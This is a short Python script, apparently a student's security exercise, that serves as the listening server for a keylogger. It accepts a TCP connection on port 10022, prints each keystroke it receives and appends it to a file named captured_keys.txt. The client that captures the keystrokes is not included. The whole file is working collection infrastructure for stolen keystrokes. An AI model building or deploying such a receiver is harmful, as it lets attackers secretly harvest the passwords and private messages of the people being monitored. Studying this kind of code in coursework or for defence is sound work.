#! /usr/bin/env python3
# Matthew Faulkner
# mjf9309@rit.edu

import socket

# Configure the server
SERVER_IP = "0.0.0.0"
SERVER_PORT = 10022

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
server_socket.listen(1)

print(f"[*] Listening for incoming connections on {SERVER_IP}:{SERVER_PORT}")
conn, addr = server_socket.accept()

print(f"[*] Connection established from {addr[0]}:{addr[1]}")

# Continuously receive data from the client
try:
    with open("captured_keys.txt", "a") as file:
        while True:
            keystroke = conn.recv(1024).decode()
            if not keystroke:
                break
            file.write(keystroke)
            print(keystroke, end="", flush=True)
except KeyboardInterrupt:
    print("\n[*] Stopping the server")
finally:
    conn.close()
    server_socket.close()
